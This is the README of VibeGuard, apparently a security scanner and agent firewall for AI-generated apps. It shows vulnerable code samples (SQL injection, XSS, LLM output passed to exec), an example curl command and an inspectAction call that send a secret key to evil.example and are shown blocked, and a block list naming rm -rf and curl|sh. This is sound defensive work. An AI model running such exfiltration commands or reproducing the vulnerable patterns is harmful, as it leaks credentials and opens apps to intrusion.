<div align="center">

<img src="website/banner.svg" alt="VibeGuard" width="480" />

<h3>Security scanner + AI agent firewall for vibe-coded apps.</h3>

<p>
Scan AI-generated code for leaked keys, SQLi, prompt injection, and uncapped agent loops. 699 rules, AST taint analysis, real-time action firewall. 100% offline. Free forever.
</p>

<p>
  <a href="https://www.npmjs.com/package/@yagyeshvyas/vibeguard"><img src="https://img.shields.io/npm/v/@yagyeshvyas/vibeguard?style=flat-square&logo=npm&logoColor=white" alt="npm version" /></a>
  <a href="https://github.com/yagyeshVyas/VibeGuard/actions"><img src="https://img.shields.io/github/actions/workflow/status/yagyeshVyas/VibeGuard/ci.yml?style=flat-square&logo=github&logoColor=white" alt="CI" /></a>
  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue?style=flat-square" alt="MIT license" /></a>
  <img src="https://img.shields.io/badge/coverage-86%25%20F1-success?style=flat-square" alt="86% F1" />
  <img src="https://img.shields.io/badge/rules-699-blue?style=flat-square" alt="699 rules" />
  <img src="https://img.shields.io/badge/MCP%20tools-82-purple?style=flat-square" alt="82 MCP tools" />
  <img src="https://img.shields.io/badge/telemetry-zero-brightgreen?style=flat-square" alt="Zero telemetry" />
</p>

<img src="website/demo.gif" alt="VibeGuard scan demo" width="640" />

<br/>
<sub>Captured against a test project with a planted <code>sk_live</code> Stripe key.</sub>

<br/><br/>

<a href="https://www.npmjs.com/package/@yagyeshvyas/vibeguard"><code>npx @yagyeshvyas/vibeguard scan</code></a>

<br/><br/>

<a href="#what-it-catches">Features</a> &bull;
<a href="#quick-start">Quick Start</a> &bull;
<a href="#benchmark">Benchmark</a> &bull;
<a href="#commands">Commands</a> &bull;
<a href="https://vibe-guard-site-ivory.vercel.app/">Website</a> &bull;
<a href="#why-vibeguard">Why</a> &bull;
<a href="#honest-scope">Limits</a>

</div>

---

## Why VibeGuard

AI coding tools ship fast but skip security. Most devs vibe-code a prototype and forget to harden it. VibeGuard raises the floor — one command, 5 seconds, no account, no telemetry.

```
$ npx @yagyeshvyas/vibeguard scan

VibeGuard security scan
./my-app

CRITICAL  api/route.ts:3  [secret.openai-key]
  OpenAI API key hardcoded in server code
  fix: Move to environment variable.

HIGH      db/query.ts:5   [taint.sql-injection]
  User input flows into SQL query via template literal (dataflow-confirmed)
  fix: Use parameterized queries / prepared statements.

HIGH      app/page.jsx:8  [taint.xss-dom]
  User input from URLSearchParams reaches innerHTML — DOM XSS
  fix: Use textContent instead of innerHTML. Sanitize with DOMPurify if needed.

Grade D  (12 files)  1 critical  3 high  2 medium  1 low

Run vibeguard fix to auto-fix 4 issues
```

---

## Quick Start

```bash
npx @yagyeshvyas/vibeguard scan
```

One-command full protection (daemon + hooks + shell guard):
```bash
npx @yagyeshvyas/vibeguard auto          # full protection on
npx @yagyeshvyas/vibeguard auto --stop    # turn it off
```

### Wire into Claude Code
```bash
claude mcp add vibeguard -- npx @yagyeshvyas/vibeguard mcp
```

### Wire into Cursor / Windsurf
```json
{ "mcpServers": { "vibeguard": { "command": "npx", "args": ["@yagyeshvyas/vibeguard", "mcp"] } } }
```

---

## What It Catches

### Leaked Stripe key in client code
```js
const key = "sk_live_51H8x...";  // anyone with devtools can issue refunds
```
Flags 50+ secret types — OpenAI, AWS, GitHub, Stripe, Slack, Firebase, GCP, Twilio, SendGrid, npm, Mailgun, Resend, Telegram — and tells you to move them to `process.env`.

### Supabase database open to the world
```sql
create table posts ( ... );  -- no RLS — anyone can read/write all rows
```
Detects missing RLS, fake RLS policies (`USING (true)`), and service-role keys in client components.

### SQL injection via template literal
```js
db.query(`SELECT * FROM users WHERE id = ${req.body.id}`);
```
AST taint analysis traces `req.body.id` through template literals to `query()` — confirmed dataflow, not a regex guess.

### Prompt injection in system prompt
```js
{ role: "system", content: "You are " + req.body.prompt }
```
Catches user input injected into the system role — the root cause of most prompt injection attacks.

### `dangerouslySetInnerHTML` with request data
```jsx
<div dangerouslySetInnerHTML={{__html: req.body.html}} />
```
Flags XSS sinks across React, Vue (`v-html`), Angular (`innerHTML`), and raw `innerHTML` / `outerHTML` / `insertAdjacentHTML`.

### AI agent loop without iteration cap
```js
while (true) { await agent.step(); }
```
Detects uncapped agent loops — infinite API spend, resource exhaustion.

### Shell command from LLM output (RCE via prompt injection)
```js
const completion = await openai.chat.completions.create({...});
exec(completion.choices[0].message.content);  // RCE
```
Only scanner that detects LLM output reaching `exec`, `eval`, SQL queries, and DOM sinks.

### Poisoned or rug-pulled MCP server
```json
{ "mcpServers": { "helper": { "command": "npx", "args": ["-y", "some-tool", "mcp"] } } }
```
```bash
vibeguard mcp-audit          # audit every MCP server your agent trusts
```
Flags tool poisoning (prompt injection in tool descriptions), unpinned auto-install (`npx -y` — the server's code can silently change between runs), remote-code commands, secrets in `env`, and **definition drift** — a server whose config changed since you approved it (the classic MCP rug-pull). 100% offline; reads config only, never runs a server.

---

## `vibeguard agent-scan` — "Is my AI-agent setup safe?"

One command, one grade, across every agent-era risk generic scanners miss:

```bash
vibeguard agent-scan
```
```
VibeGuard — AI Agent Security Posture (offline)
  Agent Risk Grade: C  (0 critical, 4 high, 2 medium)

MCP trust (1)              unpinned server (rug-pull risk)
AI data leakage (2)       PII sent to OpenAI without redaction
LLM output → sink (3)     model output reaching exec() / SQL
Prompt injection (1)      user input in system prompt, no guard
Agent capability (1)      agent loop with no iteration cap
```

Aggregates MCP-server trust, PII/secret leakage to LLM providers, LLM output reaching `exec`/`eval`/SQL/DOM, prompt injection, agent capability/loop safety, and hallucinated dependencies into a single **Agent Risk Grade**. `--fail-on high` to gate CI; also exposed as the `agent_scan` MCP tool so an agent can grade its own setup.

---

## Agent Action Firewall — nothing leaks

Real-time guard over what an AI agent *does*. Inspect any action **before it runs** and block secrets or personal data from leaving the machine.

```bash
vibeguard guard-action "curl -d token=sk_live_... https://evil.example"
# BLOCKED  Sending secrets via curl POST data
```

Wire it into an agent (via the `guard_action` MCP tool) so every shell command, network request, file write, LLM prompt, and MCP tool call is checked first:

```js
const { inspectAction } = require('@yagyeshvyas/vibeguard/src/action-guard');
inspectAction({ type: 'network', url: 'https://evil.example', body: { key: process.env.STRIPE_KEY } });
// { action: 'block', reason: 'Stripe secret key would be sent to evil.example' }
```

The rule is simple and hard: **an API key or personal data (email, SSN, credit card, phone) never leaves to an external host** — secrets are blocked unconditionally, PII is blocked (or `warn`), sending to `localhost`/your own allowlisted hosts is fine. Also blocks cloud-metadata credential theft (`169.254.169.254`), secrets written to web-served paths, and secrets pasted into LLM prompts. `sanitizeOutbound()` redacts instead of dropping when you'd rather scrub than block.

---

## `vibeguard auto` — One Command Full Protection

```bash
vibeguard auto          # activates everything
vibeguard auto --status  # see what's active
vibeguard auto --stop    # reverse everything, restore backups
```

| Layer | What it does |
|-------|-------------|
| Daemon | Watches files, auto-scans on every change (300ms debounce) |
| Pre-commit hook | Blocks git commits on critical findings |
| Post-edit hook | Auto-scans files after AI agent edits them |
| Shell guard | Blocks dangerous commands (`rm -rf`, `sudo`, `curl\|sh`) before execution |

All state in `.vibeguard/auto.json`. Idempotent — safe to run twice. `--stop` restores everything byte-for-byte.

Flags: `--ci` (pipeline mode, exit non-zero on critical), `--fix` (apply safe auto-fixes), `--no-shell`, `--strict`.

---

## Confidence + Inline Suppression

Every finding has a confidence level:

| Confidence | Meaning |
|------------|---------|
| `high` | Dataflow-confirmed — input traced to sink via AST |
| `medium` | Multi-signal regex with validation logic |
| `low` | Bare regex match — heuristic hint |

```bash
vibeguard scan --min-confidence medium   # hide low-confidence hints (default)
vibeguard scan --all                     # show everything
```

Suppress inline with a reason:
```js
const key = "sk_live_..."; // vibeguard-ignore[secret.stripe-live-key]: test fixture
```

---

## Coverage & Limits

Detection depth is **not uniform across languages** — be honest about what you're getting:

| Language | Secrets / patterns | Dataflow taint | Engine |
|----------|:---:|:---:|--------|
| JavaScript / TypeScript | Full | Interprocedural + cross-file | AST (acorn) |
| Python | Full | Heuristic (line-proximity, single-file) | regex |
| Go | Full | Targeted rules (`fmt.Sprintf` SQL) | regex |
| Java / PHP / Ruby / C# / Rust | Full | Pattern-only | regex |
| Kotlin / Swift / Bash | Full | Pattern-only | regex |

**Engine modes.** Full precision needs the optional `acorn` parser. Without it VibeGuard runs `regex-only` and says so loudly on every scan:

```
⚠ engine: regex-only — acorn not installed, AST/taint precision disabled.
```

Install precision: `npm i -D acorn acorn-walk acorn-typescript`.

**Fail-loud, never fail-silent.** If any analysis pass errors or a file fails to parse, VibeGuard reports degraded coverage instead of pretending the scan was clean:

```
⚠ degraded coverage: 2 file(s) not fully analyzed [passes: ast, taint].
```

Use `vibeguard scan --strict` to make a degraded scan a hard failure (exit 3) in CI.

**Fast modes.** `--changed` rescans only files changed since the last scan (SHA-256 cache; ~100x+ faster warm re-scans). `--staged` scans only git-staged files — ideal for a pre-commit hook. Both are per-file (cross-file analysis skipped; run a full scan for that).

**The shell guard is a mistake-catcher, not a sandbox.** It normalizes common obfuscation (base64, `$IFS`, variable indirection, quote-splitting) and blocks accidental / AI-generated dangerous commands. A determined adversary who knows the patterns can still evade it — it is not sandbox-escape prevention.

---

## Benchmark

Measured against a curated corpus of 121 files (90 vuln + 31 clean). Not a vanity number.

<!-- BENCHMARK:START -->
<!-- Auto-generated by `npm run benchmark` — do not edit manually -->

## Summary

| Category | TP | FP | FN | Precision | Recall | F1 |
|----------|----|----|----|-----------|--------|----|
| injection | 43 | 5 | 6 | 89.6% | 87.8% | 88.7% |
| secrets | 19 | 7 | 2 | 73.1% | 90.5% | 80.9% |
| xss | 16 | 0 | 1 | 100.0% | 94.1% | 97.0% |
| path-traversal | 9 | 1 | 1 | 90.0% | 90.0% | 90.0% |
| ai-safety | 8 | 2 | 6 | 80.0% | 57.1% | 66.7% |
| **OVERALL** | **95** | **15** | **16** | **86.4%** | **85.6%** | **86.0%** |

## Per-Category Details

### injection

| File | Rule ID | Verdict |
|------|---------|---------|
| sql-concat.js | `code.sql-injection` | TP |
| sql-concat.js | `taint.sql-injection` | TP |
| sql-concat2.js | `code.sql-injection` | TP |
| sql-concat2.js | `taint.sql-injection` | TP |
| sql-concat3.js | `code.sql-injection` | TP |
| sql-template.js | `db.sql-template-literal` | TP |
| sql-template.js | `taint.sql-injection` | FN |
| sql-template2.js | `db.sql-template-literal` | FN |
| sql-template2.js | `taint.sql-injection` | TP |
| sql-template3.js | `db.sql-template-literal` | TP |
| sql-template3.js | `taint.sql-injection` | FN |
| sql-raw-rb.js | `code.sql-injection` | TP |
| sql-raw2.js | `db.sql-template-literal` | TP |
| sql-knex.js | `code.sql-injection` | TP |
| sql-knex.js | `mikroorm.identifier-from-request` | FP |
| sql-sequelize.js | `code.sql-injection` | TP |
| sql-fstring.py | `py.sql-injection` | TP |
| sql-fstring2.py | `py.sql-injection` | TP |
| sql-py-concat.py | `py.sql-injection` | FN |
| sql-sprintf.go | `go.sql-fmt-sprintf` | TP |
| sql-sprintf.go | `go.sql-injection` | FP |
| sql-sprintf2.go | `go.sql-fmt-sprintf` | TP |
| sql-sprintf2.go | `go.sql-injection` | FP |
| sql-kotlin.kt | `kotlin.sql-injection` | TP |
| sql-csharp.cs | `csharp.sql-injection` | TP |
| cmd-concat.js | `taint.command-injection` | TP |
| cmd-concat.js | `ast.command-injection` | TP |
| cmd-template.js | `taint.command-injection` | TP |
| cmd-template.js | `ast.command-injection` | TP |
| cmd-concat2.js | `taint.command-injection` | TP |
| cmd-concat2.js | `ast.command-injection` | TP |
| cmd-spawn.js | `taint.command-injection` | FN |
| cmd-py.py | `py.os-system` | TP |
| cmd-py2.py | `py.subprocess-shell-true` | TP |
| cmd-py3.py | `py.os-system` | TP |
| cmd-go.go | `go.command-injection` | TP |
| eval-input.js | `ast.eval-dynamic` | TP |
| eval-template.js | `ast.eval-dynamic` | TP |
| eval-template.js | `taint.code-injection` | FP |
| eval-new-function.js | `ast.function-constructor` | TP |
| eval-new-function.js | `ast.mass-assignment` | FP |
| nosql.js | `ast.nosql-injection` | TP |
| nosql2.js | `ast.nosql-injection` | TP |
| nosql3.js | `ast.nosql-injection` | TP |
| nosql-where.js | `ast.nosql-injection` | TP |
| proto-poll.js | `injection.prototype-pollution` | TP |
| proto-poll.js | `ast.mass-assignment` | TP |
| proto-poll2.js | `injection.prototype-pollution` | TP |
| proto-poll3.js | `injection.prototype-pollution` | TP |
| ssrf.js | `ast.ssrf` | TP |
| ssrf2.js | `ast.ssrf` | FN |
| ssrf2.js | `taint.ssrf` | TP |
| open-redirect.js | `web.open-redirect` | TP |
| open-redirect2.js | `taint.open-redirect` | TP |

### secrets

| File | Rule ID | Verdict |
|------|---------|---------|
| openai-key.js | `secret.openai-key` | TP |
| openai-key2.js | `secret.anthropic-key` | TP |
| github-token.js | `secret.github-token` | TP |
| github-token2.js | `secret.github-token` | TP |
| github-token2.js | `secret.high-entropy` | FP |
| stripe-key.js | `secret.stripe-live-key` | TP |
| stripe-key.js | `secret.generic-credential` | TP |
| stripe-key.js | `stripe.key-in-client` | FP |
| stripe-restricted.js | `secret.stripe-restricted-key` | TP |
| slack-token.js | `secret.slack-token` | TP |
| gitlab-token.js | `secret.gitlab-token` | TP |
| sendgrid-key.js | `secret.sendgrid-key` | TP |
| npm-token.js | `secret.npm-token` | TP |
| npm-token.js | `secret.high-entropy` | FP |
| gcp-key.js | `secret.gcp-api-key` | FN |
| private-key.js | `secret.private-key` | TP |
| aws-key.js | `secret.aws-access-key` | TP |
| mailgun-key.js | `secret.mailgun-key` | TP |
| mailgun-key.js | `secret.high-entropy` | FP |
| telegram-token.js | `secret.telegram-bot-token` | FN |
| resend-key.js | `secret.resend-key` | TP |
| conn-string.js | `secret.conn-string-password` | TP |
| conn-string.js | `secret.connection-string` | FP |
| generic-secret.js | `secret.generic-credential` | TP |
| docker-build-arg.js | `secret.docker-build-arg` | TP |
| docker-build-arg.js | `ai.key-in-url` | FP |
| env-secret.js | `secret.aws-secret-in-env` | TP |
| env-secret.js | `secret.high-entropy` | FP |

### xss

| File | Rule ID | Verdict |
|------|---------|---------|
| reflected-xss.js | `xss.reflected-response` | TP |
| reflected-xss.js | `taint.xss-reflected` | TP |
| reflected-xss2.js | `xss.reflected-response` | TP |
| reflected-xss2.js | `taint.xss-reflected` | TP |
| reflected-xss3.js | `xss.reflected-response` | TP |
| reflected-xss3.js | `taint.xss-reflected` | TP |
| reflected-xss4.js | `xss.reflected-response` | TP |
| reflected-xss4.js | `taint.xss-reflected` | TP |
| innerhtml.js | `injection.xss-angular-innerHTML` | TP |
| innerhtml.js | `taint.xss-dom` | TP |
| innerhtml2.js | `injection.xss-innerhtml-direct` | TP |
| innerhtml2.js | `taint.xss-dom` | TP |
| dangerously-html.jsx | `react.dangerous-html` | TP |
| dangerously-html2.jsx | `react.dangerous-html` | TP |
| dangerously-html2.jsx | `ai.llm-output-dom` | TP |
| vue-v-html.js | `injection.xss-vue-v-html` | FN |
| eval-llm-output.js | `ai.llm-output-dom` | TP |

### path-traversal

| File | Rule ID | Verdict |
|------|---------|---------|
| read-concat.js | `taint.path-traversal` | TP |
| sendfile.js | `taint.path-traversal` | TP |
| read-template.js | `taint.path-traversal` | TP |
| read-template.js | `ai.tool-broad-file-access` | TP |
| write-concat.js | `taint.path-traversal` | TP |
| unlink-concat.js | `taint.path-traversal` | TP |
| create-read-stream.js | `taint.path-traversal` | TP |
| append-file.js | `taint.path-traversal` | TP |
| path-join-template.js | `taint.path-traversal` | FN |
| path-join-template.js | `upload.filename-path-traversal` | TP |
| allowlist.js | `taint.path-traversal` | FP |

### ai-safety

| File | Rule ID | Verdict |
|------|---------|---------|
| user-in-system-prompt.js | `ai.user-input-in-system-prompt` | TP |
| llm-output-exec.js | `ai.llm-output-exec` | TP |
| llm-output-exec.js | `taint.command-injection` | TP |
| llm-output-exec.js | `ai.llm-output-shell` | FP |
| llm-output-exec.js | `ast.command-injection` | FP |
| agent-loop-no-cap.js | `ai.agent-loop-no-cap` | TP |
| model-id-user-input.js | `ai.model-id-injection` | TP |
| tool-result-injection.js | `ai.tool-result-injection` | FN |
| agent-memory-poison.js | `ai.memory-poisoning` | FN |
| tool-poisoning.js | `ai.tool-poisoning` | TP |
| tool-poisoning.js | `ai.mcp-description-injection-deep` | TP |
| prompt-extraction.js | `ai.prompt-extraction` | FN |
| llm-output-dom.js | `ai.llm-output-dom` | TP |
| agent-deploy.js | `ai.agent-can-deploy` | FN |
| agent-secrets.js | `ai.agent-can-access-secrets` | FN |
| model-id-template.js | `ai.model-id-injection` | FN |

## Methodology

- **True Positive (TP)**: Expected rule fires on a vuln file.
- **False Positive (FP)**: Any finding on a clean file, or an unexpected rule on a vuln file.
- **False Negative (FN)**: Expected rule that did not fire on a vuln file.
- **Precision** = TP / (TP + FP)
- **Recall** = TP / (TP + FN)
- **F1** = 2 * (Precision * Recall) / (Precision + Recall)

Generated: 2026-07-12T18:25:03.049Z

<!-- BENCHMARK:END -->

Run `npm run benchmark` to reproduce. Per-category breakdown in `test/benchmark/benchmark-results.md`.

---

## Commands

```bash
vibeguard scan [dir]              # scan a project (auto-detects framework)
vibeguard scan --fix              # scan + apply safe auto-fixes
vibeguard scan --all              # show all findings including low-confidence
vibeguard scan --patch            # output unified diff for fixes
vibeguard agent-scan [dir]         # AI agent security posture grade
vibeguard mcp-audit               # audit MCP servers for poisoning/drift
vibeguard guard-action "cmd"      # inspect an agent action before running
vibeguard auto [dir]              # full protection (daemon + hooks + shell guard)
vibeguard auto --stop             # turn off, restore backups
vibeguard fix [dir]               # auto-fix 43 rule types
vibeguard pre-deploy [dir]        # 13-gate deployment check
vibeguard mcp                     # MCP server (for AI client integration)
vibeguard guard "command"         # check a shell command before running it
vibeguard url <url>               # scan HTTP headers for security misconfig
vibeguard pii-text "text"         # detect PII in text (email, SSN, card, phone)
vibeguard cve <package>           # check a package version for known CVEs
vibeguard install-hook            # git pre-commit hook (blocks on critical)
vibeguard install-hook-post       # PostToolUse hook (auto-scan AI edits)
vibeguard init-ci                 # generate CI/CD workflow files
```

---

## Privacy

VibeGuard runs entirely on your machine. No telemetry, no analytics, no network calls by default.

| Command | Network? |
|---------|---------|
| `scan`, `fix`, `auto`, `mcp`, `install` | Never |
| `cve` (package name lookup) | Opt-in, OSV.dev only |
| `url` (header scan) | Opt-in, URL you provide |

The runtime interceptor adds guardrails that make data exfiltration significantly harder — it wraps `fetch`, `http.request`, `child_process.exec`, and `fs.readFileSync` to block outbound secrets, PII, and sensitive file access. It is not a sandbox escape prevention layer.

---

## Honest Scope

VibeGuard catches the mechanical security holes that AI coding tools leave behind. It does **not**:

- Prove your app is safe or leak-proof
- Track personal data end-to-end through your app
- Judge business logic flaws
- Replace a real security review for anything touching money, auth, or personal data

It raises the floor fast — catching the holes that AI tools create by default. The benchmark numbers above are honest: 86.0% F1 means it misses ~14% of real issues and produces some false positives. Run `npm run benchmark` to reproduce. Read the per-category details in `test/benchmark/benchmark-results.md` before relying on it.

### Honest limits (so the claims stay true)

- **Sandbox uses Node `vm`, not a hard boundary** — per Node.js docs, `vm` is not a security sandbox. A determined attacker can escape via prototype chain traversal. The memory cap is currently unenforced. Treat `sandbox_exec` as a raised floor, not a steel vault. (Hard isolation via `isolated-vm` is planned as an optional dependency.)
- **Guard, not a sandbox** — stops accidents, agent mistakes, and the common exfil/tamper paths; not a determined attacker with arbitrary local code execution who rewrites both a module and its manifest.
- **Runtime enforcement is Node-scoped** — non-Node child runtimes making their own network calls bypass the wrappers (static agent-scan / guard-action still cover them).
- **AI-safety recall is 57%** — the weakest benchmark category (`test/benchmark/benchmark-results.md`). Prompt injection, memory poisoning, and tool-result injection detection are improving but not yet comprehensive. The firewall is regex-based — paraphrased injections can evade it.
- **Taint analysis is JS/TS only** — Python taint is heuristic (line-proximity, not dataflow). Go/Rust/Java/other languages have pattern rules but no taint tracking.
- **Integrity ≠ full chain of trust** — detects source tampering; npm provenance is the real anchor.
- **VibeGuard never calls an LLM** — `deep_scan` emits structured review contracts for your AI client to process. VibeGuard itself is 100% deterministic, zero-network.

---

## Languages

JavaScript, TypeScript, Python, Go, Java, Ruby, PHP, C#, Rust, Kotlin, Swift, Bash, SQL, YAML. Language-specific rules are gated by file extension — Go rules don't fire on `.js` files.

---

## CI/CD

```bash
vibeguard auto --ci                # non-interactive, exit non-zero on critical
vibeguard init-ci                  # generate GitHub Actions workflow
vibeguard scan --output sarif      # SARIF output for GitHub Code Scanning
```

Templates included for GitLab CI, Jenkins, CircleCI, Azure Pipelines, Bitbucket, Travis CI, Buildkite.

---

## Development

```bash
npm install
npm test          # 356 tests, 0 failures
npm run benchmark # precision/recall/F1
npm run counts    # verify rule/tool counts match source
npm run lint      # 0 errors
```

---

## License

MIT. Free forever. No ads. No tracking. No data collection.

---

<div align="center">

## Built by Yagyesh Vyas

<p>
  <a href="https://github.com/yagyeshVyas"><img src="https://img.shields.io/badge/GitHub-yagyeshVyas-181717?style=for-the-badge&logo=github&logoColor=white" alt="GitHub" /></a>
  <a href="https://www.linkedin.com/in/yagyeshvyas"><img src="https://img.shields.io/badge/LinkedIn-Yagyesh%20Vyas-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white" alt="LinkedIn" /></a>
  <a href="https://www.npmjs.com/~yagyeshvyas"><img src="https://img.shields.io/badge/npm-@yagyeshvyas-CB3837?style=for-the-badge&logo=npm&logoColor=white" alt="npm" /></a>
  <a href="https://vibe-guard-site-ivory.vercel.app/"><img src="https://img.shields.io/badge/Website-vibe--guard--site-ivory.vercel.app-000000?style=for-the-badge&logo=vercel&logoColor=white" alt="Website" /></a>
</p>

Found a bug? [Open an issue](https://github.com/yagyeshVyas/VibeGuard/issues). &bull; Have a question? [Start a discussion](https://github.com/yagyeshVyas/VibeGuard/discussions).

<sub>&copy; 2026 Yagyesh Vyas. Released under the MIT License.</sub>

</div>